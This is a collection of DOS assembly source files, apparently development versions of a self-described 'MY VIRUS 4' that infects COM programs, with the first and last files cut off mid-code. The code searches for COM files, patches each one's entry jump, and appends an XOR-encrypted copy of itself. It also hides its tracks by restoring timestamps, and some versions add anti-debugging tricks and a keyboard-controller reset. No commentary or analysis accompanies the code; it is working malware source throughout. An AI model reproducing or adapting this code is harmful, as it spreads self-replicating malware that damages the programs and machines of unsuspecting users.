	jmp     rt
ar     PROC
	mov     bx,ax
ar     ENDP
	mov     ax,5700h
	int     21h
	mov     word ptr [si+0dh+34h],cx
	mov     word ptr [si+0dh+36h],dx
	mov     ax,4200h
	mov     cx,00h
	mov     dx,00h
	int     21h
	mov     ah,3fh
	mov     cx,0003h
	mov     dx,si
	add     dx,38h
	int     21h
	mov     ax,4200h
	xor     cx,cx
	xor     dx,dx
	int     21h
	mov     ax,4000h
	mov     cx,0003h
	mov     dx,3eh  
	add     dx,si        
	int     21h
	mov     ah,42h
	mov     al,02h
	mov     cx,00h
	mov     dx,00d
	int     21h
time   PROC
	Mov     Ah,2ch
	Int     21h
	Mov     [Si-0eh],Dx  ;  à·Ø‡†¢®‚Ï äãûó
	Mov     Cx,Dec_l
	Push	Si
	Mov	Di,Si
	Add	Di,0190h
	Mov	Dx,014fh
	Add	Si,Dx
	Rep	Movsb
	Pop	Si
time   ENDP
	Mov	Dx,[Si-0eh]
	Mov	Cx,Si
	Add	Cx,0190h
	Jmp	Cx
	Push	Si
;	Add	Si,desc
Cod:
	Xor	[Si],Dx
	Inc	Si
	Inc	Si
	Loop    Cod
	Pop	Si
	mov     dx,si
	sub     dx,real_start
	mov     cx,lng
	mov     ax,4000h
	int     21h                   
	mov     cx,[si+0dh+34h]
	mov     dx,[si+0dh+36h]
	and     dx,65055d
	or      dx,01a0h
	mov     ax,5701h
	int     21h
	mov     ah,3eh
	int     21h
rt     PROC
	xor     ax,ax
	xor     dx,dx
	xor     bx,bx
	mov     di,0100h
	push    di
	ret
rt     ENDP
sc      ENDP
END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_415.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_424.ASM]ƒƒƒ
	.MODEL tiny
	.186
	.code 
	org 100h

lng             EQU     0c2h

start:
	jmp	sc
	db	200d dup(08h)
sc     PROC

Virn:
	DB	0bah	;--- KEY 
Sad	DB	00h,00h
        Call	opt
opt:	Pop	Bp
	Sub	Bp,1d1h ;------------?
	Cli
	Call	Serg
dead	db	0fbh
	Mov	byte ptr [Bp+sdf],90h
	Mov	byte ptr [Bp+dir],00h
	jmp     late

vir     db      "\???????.COM",000h
des     db      "000000000000000000000"	;00h
atrib	db	"0"			;15h
time	db	"00"			;16h
date	db	"00"			;18h
dlina	db	"0000"			;1Ah
new_f	db	"000000000000"		;1Eh
new_j	db	"È00"
buf_j	db	"Õ ê"
dir	db	00h
;------------------------------------------------------------------------------
late:
	Lea	Si,buf_j+[Bp]
	Mov	Di,0100h
	Movsb
	Movsw
Virus:
	Mov     ah,1ah
	Lea     Si,vir+[Bp]
	Mov	Dx,Si
	Add	Dx,0dh
	Int     21h
	Mov	Dx,Si
	Add     dx,1h
find_f:
	Mov     ah,4eh
	Mov     cx,00h
	Int     21h  
	jmp     ok
find_n:
	Mov     ah,4fh
	Int     21h

ok:
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg:
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     fg
	jmp     rt
fg:
	dec     dx
	Mov     byte ptr [Bp]+dir,0ffh
	jmp     find_f

chk:
	Mov     cx,[Bp]+offset date
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [Bp]+offset dlina,62000d
	ja      find_n
	cmp     word ptr [Bp]+offset dlina,100h
	jb      find_n
	push    si
	Mov     di,si
	Add     di,0dh 
	Add     si,02bh
	Push	Cs
	Pop	Es
	cmp     byte ptr [Bp]+dir,0ffh
	jnz     nam
	Mov     al,5ch
	stosb
nam:
	lodsb
	stosb
	cmp     al,00
	jnz     nam
	pop     Si
	Mov     dx,si
	Add     dx,00dh
	Mov	Cx,[Bp]+offset atrib
	Xor	Ch,Ch
	and     cx,0fffeh
	Mov     ax,4301h
	Int     21h
	Mov     ax,[Bp]+offset dlina ;====lengh of file to AX
	Sub     ax,0003h
	Mov     [Bp]+1h+offset new_j,ax ;==========new JMP to virus
	Mov     al,02h               
	Mov     ah,3dh
	Int     21h                   
	jnb     ar
	jmp     rt
ar:
	Mov     bx,ax
	Mov     ax,4200h
	Mov     cx,00h
	Mov     dx,00h
	Int     21h
	Mov     ah,3fh
	Mov     cx,0003h
	Lea     dx,buf_j+[Bp]
	Int     21h
	Mov	Di,offset buf_j+[Bp]
	Cmp	Di,'ZM'
	Jnz	infect
	Mov	Ah,3eh
	Int	21h
	Jmp	find_n
infect:
	Mov     ax,4200h
	Xor     cx,cx
	Xor     dx,dx
	Int     21h
	Mov     ax,4000h
	Mov     cx,0003h
	Lea	Dx,new_j+[Bp]
	Int     21h
	Mov     ah,42h
	Mov     al,02h
	Xor	Cx,Cx
	Xor	Dx,Dx
	Int     21h
	Mov	Cx,4ah
	Lea	Si,rec+[Bp]
	Lea	Di,Ert+[Bp]
	Rep	Movsb
	Mov	Ah,2ch
	Int	21h
	Mov	word ptr Sad+[Bp],Dx 
	Jmp	Ert
Rec:
	Call	Der
	Lea	Dx,Sc+[Bp]
	Mov     cx,1a8h
	Mov     ax,4000h
	Int     21h                   
	Mov     cx,[Bp]+offset time
	Mov     dx,[Bp]+offset date
	and     dx,65055d
	or      dx,01a0h
	Mov     ax,5701h
	Int     21h
	Mov     ah,3eh
	Int     21h
rt:
	Push	Cs
	Pop	Es
	Xor     Ax,Ax
	Xor	Cx,Cx
	Xor     Dx,Dx
	Xor     Bx,Bx
	Push    0100h
	Ret
sc      ENDP

Serg:
	Mov	byte ptr [Bp+sdf],4ah
sdf:
	Nop
Der:
	Lea	Si,dead+[Bp]
	Mov	Cx,lng
Decod:
	Xor	word ptr [Si],Dx
	Inc	Si
	Inc	Si
	Loop	Decod
	Ret
Ert:
END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_424.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_432.ASM]ƒƒƒ
;<  MY VIRUS 4 > 

	.MODEL tiny
	.386
	.stack
	.code  
	org 100h
start:
       Jmp      sc

com_adr         EQU     100h+desc
real_start      EQU     desc+3h
Dec_l		EQU	43h 
d_lng           EQU     0193h ;_____-------_____- ?
desc            EQU     28d
lng             EQU     432d

sc     PROC 
	Call	dr
dr     PROC
	Pop	Bp
dr     ENDP
	Mov     Si,Bp
	Add	Si,desc   ;-------------- now !!! if modific. decoder
	Mov	Di,Si
	Mov	Dl,00h
	Mov     Cx,d_lng
	Push	Si
Decod:
	Lodsb
	Xor	Al,Ah
	Rol	ah,05h
	Add	Ah,Dl
	Stosb
	Loop    Decod
	Pop	Si
	Jmp	bep
vir    DB      "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooo   Èooooooooooo
bep    PROC
	push    si
bep    ENDP
	add     si,56d 
	mov     cx,0003h
	mov     di,100h
	rep movsb
	pop     si
	mov     ah,1ah
	mov     dx,si
	add     dx,000dh
	int     21h
	mov     dx,1h
	add     dx,si
find_f PROC
	mov     ah,4eh
	mov     cx,00h
	int     21h  
find_f ENDP
	jmp     ok
find_n PROC
	mov     ah,4fh
	int     21h
find_n ENDP

ok     PROC
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg     PROC
	cmp     bp,65535d
dg     ENDP
	jnz     fg
	jmp     rt
fg     PROC
	dec     dx
fg     ENDP
	mov     bp,65535d
	jmp     find_f
ok     ENDP

chk    PROC
	mov     cx,[si+0dh+18h]
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [si+0dh+1ah],65000d
	ja      find_n
	cmp     word ptr [si+0dh+1ah],100h
	jb      find_n
	push    si
	mov     di,si
	add     di,0dh 
	add     si,02bh
	cmp     bp,65535d
	jnz     nam
	mov     al,5ch
	stosb
nam    PROC
	lodsb
	stosb
nam    ENDP
	cmp     al,00
	jnz     nam
	pop     si
	mov     dx,si
	add     dx,00dh
	mov     ax,4300h
	int     21h
	mov     word ptr [si+36h],cx 
	and     cx,0fffeh
	mov     ax,4301h
	int     21h
chk   ENDP       
	mov      ax,[si+0dh+1ah] ;======lengh of file to AX
	sub      ax,0003h
	mov      [si+3fh],ax ;==========new JMP to virus
	mov     al,02h               
	mov     ah,3dh
	int     21h                   
	jnb     ar
	jmp     rt
ar     PROC
	mov     bx,ax
ar     ENDP
	mov     ax,5700h
	int     21h
	mov     word ptr [si+0dh+34h],cx
	mov     word ptr [si+0dh+36h],dx
	mov     ax,4200h
	mov     cx,00h
	mov     dx,00h
	int     21h
	mov     ah,3fh
	mov     cx,0003h
	mov     dx,si
	add     dx,38h
	int     21h
	mov     ax,4200h
	xor     cx,cx
	xor     dx,dx
	int     21h
	mov     ax,4000h
	mov     cx,0003h
	mov     dx,3eh  
	add     dx,si        
	int     21h
	mov     ah,42h
	mov     al,02h
	mov     cx,00h
	mov     dx,00d
	int     21h
time   PROC
	Mov     Ah,2ch
	Int     21h
	Mov     [Si-13h],Dl  ;  à·Ø‡†¢®‚Ï äãûó
	Mov     Cx,Dec_l
	Push	Si
	Mov	Di,Si
	Add	Di,0191h
	Mov	Dx,014eh  ;--f
	Add	Si,Dx
	Rep	Movsb
	Pop	Si
time   ENDP
	Mov	Dx,[Si-13h]
	Mov	Ax,Si
	Add	Ax,0191h
	Jmp	Ax
	Push	Si
	Mov	Di,Si
	Mov	Cx,D_lng
	Xor	Ax,Ax
Cod:
	Lodsb
	Xor	Al,Ah
	Rol	Ah,05
	Add	Ah,Dl
	Stosb
	Loop    Cod

	Pop	Si
	mov     dx,si
	sub     dx,real_start
	mov     cx,lng
	mov     ax,4000h
	int     21h                   
	mov     cx,[si+0dh+34h]
	mov     dx,[si+0dh+36h]
	and     dx,65055d
	or      dx,01a0h
	mov     ax,5701h
	int     21h
	mov     ah,3eh
	int     21h
rt     PROC
	xor     ax,ax
	xor     dx,dx
	xor     bx,bx
	mov     di,0100h
	push    di
	ret
rt     ENDP
sc      ENDP
END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_432.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_436.ASM]ƒƒƒ
;<  MY VIRUS 4 > 

	.MODEL tiny
	.386
	.stack
	.code  
	org 100h
start:
       Jmp      sc

com_adr         EQU     100h+desc
real_start      EQU     desc+3h
Dec_l		EQU	43h 
d_lng           EQU     0193h ;_____-------_____- ?
desc            EQU     032d
lng             EQU     436d

sc     PROC 
	Call	dr
dr     PROC
	Pop	Bp
dr     ENDP
	Mov     Si,Bp
	Add	Si,desc   ;-------------- now !!! if modific. decoder
	mov	al,0feh
	out	64h,al
	Mov	Di,Si
	Mov	Dl,00h
	Mov     Cx,d_lng
	Push	Si
Decod:
	Lodsb
	Xor	Al,Ah
	Rol	ah,05h
	Add	Ah,Dl
	Stosb
	Loop    Decod
	Pop	Si
	Jmp	bep
vir    DB      "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooo   Èooooooooooo
bep:
	push    si
	add     si,56d 
	mov     cx,0003h
	mov     di,100h
	rep movsb
	pop     si
	mov     ah,1ah
	mov     dx,si
	add     dx,000dh
	int     21h
	mov     dx,1h
	add     dx,si
find_f PROC
	mov     ah,4eh
	mov     cx,00h
	int     21h  
find_f ENDP
	jmp     ok
find_n PROC
	mov     ah,4fh
	int     21h
find_n ENDP

ok     PROC
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg     PROC
	cmp     bp,65535d
dg     ENDP
	jnz     fg
	jmp     rt
fg     PROC
	dec     dx
fg     ENDP
	mov     bp,65535d
	jmp     find_f
ok     ENDP

chk    PROC
	mov     cx,[si+0dh+18h]
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [si+0dh+1ah],65000d
	ja      find_n
	cmp     word ptr [si+0dh+1ah],100h
	jb      find_n
	push    si
	mov     di,si
	add     di,0dh 
	add     si,02bh
	cmp     bp,65535d
	jnz     nam
	mov     al,5ch
	stosb
nam    PROC
	lodsb
	stosb
nam    ENDP
	cmp     al,00
	jnz     nam
	pop     si
	mov     dx,si
	add     dx,00dh
	mov     ax,4300h
	int     21h
	mov     word ptr [si+36h],cx 
	and     cx,0fffeh
	mov     ax,4301h
	int     21h
chk   ENDP       
	mov      ax,[si+0dh+1ah] ;======lengh of file to AX
	sub      ax,0003h
	mov      [si+3fh],ax ;==========new JMP to virus
	mov     al,02h               
	mov     ah,3dh
	int     21h                   
	jnb     ar
	jmp     rt
ar     PROC
	mov     bx,ax
ar     ENDP
	mov     ax,5700h
	int     21h
	mov     word ptr [si+0dh+34h],cx
	mov     word ptr [si+0dh+36h],dx
	mov     ax,4200h
	mov     cx,00h
	mov     dx,00h
	int     21h
	mov     ah,3fh
	mov     cx,0003h
	mov     dx,si
	add     dx,38h
	int     21h
	mov     ax,4200h
	xor     cx,cx
	xor     dx,dx
	int     21h
	mov     ax,4000h
	mov     cx,0003h
	mov     dx,3eh  
	add     dx,si        
	int     21h
	mov     ah,42h
	mov     al,02h
	mov     cx,00h
	mov     dx,00d
	int     21h
time   PROC
	Mov     Ah,2ch
	Int     21h
	Mov     [Si-13h],Dl  ;  à·Ø‡†¢®‚Ï äãûó
	Mov     Cx,Dec_l
	Push	Si
	Mov	Di,Si
	Add	Di,0191h
	Mov	Dx,014eh  ;--f
	Add	Si,Dx
	Rep	Movsb
	Pop	Si
time   ENDP
	Mov	Dx,[Si-13h]
	Mov	Ax,Si
	Add	Ax,0191h
	Jmp	Ax
	Push	Si
	Mov	Di,Si
	Mov	Cx,D_lng
	Xor	Ax,Ax
Cod:
	Lodsb
	Xor	Al,Ah
	Rol	Ah,05
	Add	Ah,Dl
	Stosb
	Loop    Cod

	Pop	Si
	mov     dx,si
	sub     dx,real_start
	mov     cx,lng
	mov     ax,4000h
	int     21h                   
	mov     cx,[si+0dh+34h]
	mov     dx,[si+0dh+36h]
	and     dx,65055d
	or      dx,01a0h
	mov     ax,5701h
	int     21h
	mov     ah,3eh
	int     21h
rt     PROC
	xor     ax,ax
	xor     dx,dx
	xor     bx,bx
	mov     di,0100h
	push    di
	ret
rt     ENDP
sc      ENDP
END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_436.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_446.ASM]ƒƒƒ
;<  MY VIRUS 4 > 

	.MODEL tiny
	.386
	.stack
	.code  
	org 100h
start:
       Jmp      sc

com_adr         EQU     100h+desc
real_start      EQU     desc+3h
Dec_l		EQU	43h 
d_lng           EQU     0193h ;_____-------_____- ?
desc            EQU     030d
lng             EQU     446d

sc     PROC 
	Push	Cs
	Pop	SS
	Pushf
	Pop	Ax
	Test	Ah,01h
	Jz	Right
	Push	100h
	ret
Right:
	Call	dr
dr     PROC
	Pop	Bp
dr     ENDP
	Mov     Si,Bp
	Add	Si,desc   ;-------------- now !!! if modific. decoder
	Xor	Ax,Ax
	Mov	Di,Si
	Mov	Dl,00h
	Mov     Cx,d_lng
	Push	Si
Decod:
	Lodsb
	Xor	Al,Ah
	Rol	ah,05h
	Add	Ah,Dl
	Stosb
	Loop    Decod
	Pop	Si
	Jmp	bep
vir    DB      "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooo   Èooooooooooo
bep:
	push    si
	add     si,56d 
	mov     cx,0003h
	mov     di,100h
	rep movsb
	pop     si
	mov     ah,1ah
	mov     dx,si
	add     dx,000dh
	int     21h
	mov     dx,1h
	add     dx,si
find_f PROC
	mov     ah,4eh
	mov     cx,00h
	int     21h  
find_f ENDP
	jmp     ok
find_n PROC
	mov     ah,4fh
	int     21h
find_n ENDP

ok     PROC
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg     PROC
	cmp     bp,65535d
dg     ENDP
	jnz     fg
	jmp     rt
fg     PROC
	dec     dx
fg     ENDP
	mov     bp,65535d
	jmp     find_f
ok     ENDP

chk    PROC
	mov     cx,[si+0dh+18h]
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [si+0dh+1ah],65000d
	ja      find_n
	cmp     word ptr [si+0dh+1ah],100h
	jb      find_n
	push    si
	mov     di,si
	add     di,0dh 
	add     si,02bh
	cmp     bp,65535d
	jnz     nam
	mov     al,5ch
	stosb
nam    PROC
	lodsb
	stosb
nam    ENDP
	cmp     al,00
	jnz     nam
	pop     si
	mov     dx,si
	add     dx,00dh
	mov     ax,4300h
	int     21h
	mov     word ptr [si+36h],cx 
	and     cx,0fffeh
	mov     ax,4301h
	int     21h
chk   ENDP       
	mov      ax,[si+0dh+1ah] ;======lengh of file to AX
	sub      ax,0003h
	mov      [si+3fh],ax ;==========new JMP to virus
	mov     al,02h               
	mov     ah,3dh
	int     21h                   
	jnb     ar
	jmp     rt
ar     PROC
	mov     bx,ax
ar     ENDP
	mov     ax,5700h
	int     21h
	mov     word ptr [si+0dh+34h],cx
	mov     word ptr [si+0dh+36h],dx
	mov     ax,4200h
	mov     cx,00h
	mov     dx,00h
	int     21h
	mov     ah,3fh
	mov     cx,0003h
	mov     dx,si
	add     dx,38h
	int     21h
	mov     ax,4200h
	xor     cx,cx
	xor     dx,dx
	int     21h
	mov     ax,4000h
	mov     cx,0003h
	mov     dx,3eh  
	add     dx,si        
	int     21h
	mov     ah,42h
	mov     al,02h
	mov     cx,00h
	mov     dx,00d
	int     21h
time   PROC
	Mov     Ah,2ch
	Int     21h
	Mov     [Si-13h],Dl  ;  à·Ø‡†¢®‚Ï äãûó
	Mov     Cx,Dec_l
	Push	Si
	Mov	Di,Si
	Add	Di,0191h
	Mov	Dx,014eh  ;--f
	Add	Si,Dx
	Rep	Movsb
	Pop	Si
time   ENDP
	Mov	Dx,[Si-13h]
	Mov	Ax,Si
	Add	Ax,0191h
	Jmp	Ax
	Push	Si
	Mov	Di,Si
	Mov	Cx,D_lng
	Xor	Ax,Ax
Cod:
	Lodsb
	Xor	Al,Ah
	Rol	Ah,05
	Add	Ah,Dl
	Stosb
	Loop    Cod

	Pop	Si
	mov     dx,si
	sub     dx,real_start
	mov     cx,lng
	mov     ax,4000h
	int     21h                   
	mov     cx,[si+0dh+34h]
	mov     dx,[si+0dh+36h]
	and     dx,65055d
	or      dx,01a0h
	mov     ax,5701h
	int     21h
	mov     ah,3eh
	int     21h
rt     PROC
	xor     ax,ax
	xor     dx,dx
	xor     bx,bx
	mov     di,0100h
	push    di
	ret
rt     ENDP
sc      ENDP
END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_446.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_449.ASM]ƒƒƒ
;<  MY VIRUS 4 > 

	.MODEL tiny
	.386
	.stack
	.code  
	org 100h
start:
       Jmp      sc

com_adr         EQU     100h+desc
real_start      EQU     desc+3h
Dec_l		EQU	43h 
d_lng           EQU     0193h ;_____-------_____- ?
desc            EQU     030d
lng             EQU     446d

sc     PROC 
	Push	Cs
	Pop	SS
	Pushf
	Pop	Ax
	Test	Ah,01h
	Jz	Right
	Push	100h
	ret
Right:
	Call	dr
dr     PROC
	Pop	Bp
dr     ENDP
	Mov     Si,Bp
	Add	Si,desc   ;-------------- now !!! if modific. decoder
	Xor	Ax,Ax
	Mov	Di,Si
	Mov	Dl,00h
	Mov     Cx,d_lng
	Push	Si
Decod:
	Lodsb
	Xor	Al,Ah
	Rol	ah,05h
	Add	Ah,Dl
	Stosb
	Loop    Decod
	Pop	Si
	Jmp	bep
vir    DB      "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooo   Èooooooooooo
bep:
	push    si
	add     si,56d 
	mov     cx,0003h
	mov     di,100h
	rep movsb
	pop     si
	mov     ah,1ah
	mov     dx,si
	add     dx,000dh
	int     21h
	mov     dx,1h
	add     dx,si
find_f PROC
	mov     ah,4eh
	mov     cx,00h
	int     21h  
find_f ENDP
	jmp     ok
find_n PROC
	mov     ah,4fh
	int     21h
find_n ENDP

ok     PROC
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg     PROC
	cmp     bp,65535d
dg     ENDP
	jnz     fg
	jmp     rt
fg     PROC
	dec     dx
fg     ENDP
	mov     bp,65535d
	jmp     find_f
ok     ENDP

chk    PROC
	mov     cx,[si+0dh+18h]
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [si+0dh+1ah],65000d
	ja      find_n
	cmp     word ptr [si+0dh+1ah],100h
	jb      find_n
	push    si
	mov     di,si
	add     di,0dh 
	add     si,02bh
	cmp     bp,65535d
	jnz     nam
	mov     al,5ch
	stosb
nam    PROC
	lodsb
	stosb
nam    ENDP
	cmp     al,00
	jnz     nam
	pop     si
	mov     dx,si
	add     dx,00dh
	mov     ax,4300h
	int     21h
	mov     word ptr [si+36h],cx 
	and     cx,0fffeh
	mov     ax,4301h
	int     21h
chk   ENDP       
	mov      ax,[si+0dh+1ah] ;======lengh of file to AX
	sub      ax,0003h
	mov      [si+3fh],ax ;==========new JMP to virus
	mov     al,02h               
	mov     ah,3dh
	int     21h                   
	jnb     ar
	jmp     rt
ar     PROC
	mov     bx,ax
ar     ENDP
	mov     ax,5700h
	int     21h
	mov     word ptr [si+0dh+34h],cx
	mov     word ptr [si+0dh+36h],dx
	mov     ax,4200h
	mov     cx,00h
	mov     dx,00h
	int     21h
	mov     ah,3fh
	mov     cx,0003h
	mov     dx,si
	add     dx,38h
	int     21h
	mov     ax,4200h
	xor     cx,cx
	xor     dx,dx
	int     21h
	mov     ax,4000h
	mov     cx,0003h
	mov     dx,3eh  
	add     dx,si        
	int     21h
	mov     ah,42h
	mov     al,02h
	mov     cx,00h
	mov     dx,00d
	int     21h
time   PROC
	Mov     Ah,2ch
	Int     21h
	Mov     [Si-13h],Dl  ;  à·Ø‡†¢®‚Ï äãûó
	Mov     Cx,Dec_l
	Push	Si
	Mov	Di,Si
	Add	Di,0191h
	Mov	Dx,014eh  ;--f
	Add	Si,Dx
	Rep	Movsb
	Pop	Si
time   ENDP
	Mov	Dx,[Si-13h]
	Mov	Ax,Si
	Add	Ax,0191h
	Jmp	Ax
	Push	Si
	Mov	Di,Si
	Mov	Cx,D_lng
	Xor	Ax,Ax
Cod:
	Lodsb
	Xor	Al,Ah
	Rol	Ah,05
	Add	Ah,Dl
	Stosb
	Loop    Cod

	Pop	Si
	mov     dx,si
	sub     dx,real_start+0dh
	mov     cx,lng+03h
	mov     ax,4000h
	int     21h                   
	mov     cx,[si+0dh+34h]
	mov     dx,[si+0dh+36h]
	and     dx,65055d
	or      dx,01a0h
	mov     ax,5701h
	int     21h
	mov     ah,3eh
	int     21h
rt     PROC
	xor     ax,ax
	xor     dx,dx
	xor     bx,bx
	mov     di,0100h
	push    di
	ret
rt     ENDP
sc      ENDP
END start
END
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_449.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[C_458.ASM]ƒƒƒ
;<  MY VIRUS 4 > 

	.MODEL tiny
	.386
	.stack
	.code  
	org 100h
start:
       Jmp      sc

com_adr         EQU     100h+desc
real_start      EQU     desc+3h
Dec_l           EQU     38h 
d_lng           EQU     00c3h ;_____-------_____- ?
desc            EQU     41h
lng             EQU     458d

sc     PROC 
	Call    dr
dr     PROC
	Pop     Bp
dr     ENDP
	Mov     Si,Bp
	Add     Si,desc   ;-------------- now !!! if modific. decoder
	Push    Si
	Mov     Dx,0000h
	Push    Cs
	Pop     Ss
	Pushf
	Mov     Di,Sp
	Mov     Bx,[Di] 
	Lahf
	Sub     Bx,Ax
	Xchg    Ax,Bx
	Xor     Al,Al
	Sub     Ah,70h
	Push    100h
	Xchg    Al,Ah
	Mov     Cx,4
	Push	Dx
	Mul     Cx
	Pop	Dx
	Sub     Si,Ax
	Mov     Ax,[Di]
	Sub     Ax,7202h
	Xor	Al,Al
	Add	Dx,Ax
	Pop	Ax
	Pop	Ax
	Pop	Si
	Mov     Cx,d_lng
	Push	Si
Decod  PROC
	Xor     [Si],Dx 
	Inc     Si
	Inc     Si
Decod  ENDP
	Loop    Decod
	Pop     Si
	Jmp     bep
vir    DB      "\???????.COM oooooooooooooooooooooooooooooooooooooooooooooooooÈooooooooooo
bep    PROC
	push    si
bep    ENDP
	add     si,56d 
	mov     cx,0003h
	mov     di,100h
	rep movsb
	pop     si
	mov     ah,1ah
	mov     dx,si
	add     dx,000dh
	int     21h
	mov     dx,1h
	add     dx,si
find_f PROC
	mov     ah,4eh
	mov     cx,00h
	int     21h  
find_f ENDP
	jmp     ok
find_n PROC
	mov     ah,4fh
	int     21h
find_n ENDP

ok     PROC
	jnb     chk
	cmp     al,12h
	jz      dg
	jmp     chk
dg     PROC
	cmp     bp,65535d
dg     ENDP
	jnz     fg
	jmp     rt
fg     PROC
	dec     dx
fg     ENDP
	mov     bp,65535d
	jmp     find_f
ok     ENDP

chk    PROC
	mov     cx,[si+0dh+18h]
	and     cx,01e0h
	cmp     cx,01a0h
	jz      find_n
	cmp     word ptr [si+0dh+1ah],65000d
	ja      find_n
	cmp     word ptr [si+0dh+1ah],100h
	jb      find_n
	push    si
	mov     di,si
	add     di,0dh 
	add     si,02bh
	cmp     bp,65535d
	jnz     nam
	mov     al,5ch
	stosb
nam    PROC
	lodsb
	stosb
nam    ENDP
	cmp     al,00
	jnz     nam
	pop     si
	mov     dx,si
	add     dx,00dh
	mov     ax,4300h
	int     21h
	mov     word ptr [si+36h],cx 
	and     cx,0fffeh
	mov     ax,4301h
	int     21h
chk   ENDP       
	mov      ax,[si+0dh+1ah] ;======lengh of file to AX
	sub      ax,0003h
	mov      [si+3fh],ax ;==========new JMP to virus
	mov     al,02h               
	mov     ah,3dh
	int     21h                   
	jnb     ar
	jmp     rt
ar     PROC
	mov     bx,ax
ar     ENDP
	mov     ax,5700h
	int     21h
	mov     word ptr [si+0dh+34h],cx
	mov     word ptr [si+0dh+36h],dx
	mov     ax,4200h
	mov     cx,00h
	mov     dx,00h
	int     21h
	mov     ah,3fh
	mov     cx,0003h
	mov     dx,si
	add     dx,38h
	int     21h
	mov     ax,4200h
	xor     cx,cx
	xor     dx,dx
	int     21h
	mov     ax,4000h
	mov     cx,0003h
	mov     dx,3eh  
	add     dx,si        
	int     21h
	mov     ah,42h
	mov     al,02h
	mov     cx,00h
	mov     dx,00d
	int     21h
time   PROC
	Mov     Ah,2ch
	Int     21h
	Mov     [Si-39h],Dx ;ƒ¬ƒƒ*> à·Ø‡†¢®‚Ï äãûó
	Mov     Cx,Dec_l ;    ≥
	Push    Si ;          ≥
	Mov     Di,Si ;       ≥
	Add     Di,0190h ;    ≥
	Mov     Dx,014fh ;    ≥
	Add     Si,Dx ;       ≥
	Rep     Movsb ;       ≥
	Pop     Si ;          ≥
time   ENDP ;		      ≥
	Mov     Dx,[Si-39h] ;ƒŸ
	Mov     Cx,Si
	Add     Cx,0190h
	Jmp     Cx
	Push    Si
;       Add     Si,desc
Cod:
	Xor     [Si],Dx
	Inc     Si
	Inc     Si
	Loop    Cod
	Pop     Si
	mov     dx,si
	sub     dx,real_start
	mov     cx,lng
	mov     ax,4000h
	int     21h                   
	mov     cx,[si+0dh+34h]
	mov     dx,[si+0dh+36h]
	and     dx,65055d
	or      dx,01a0h
	mov     ax,5701h
	int     21h
	mov     ah,3eh
	int     21h
rt     PROC
	xor     ax,ax
	xor     dx,dx
	xor     bx,bx
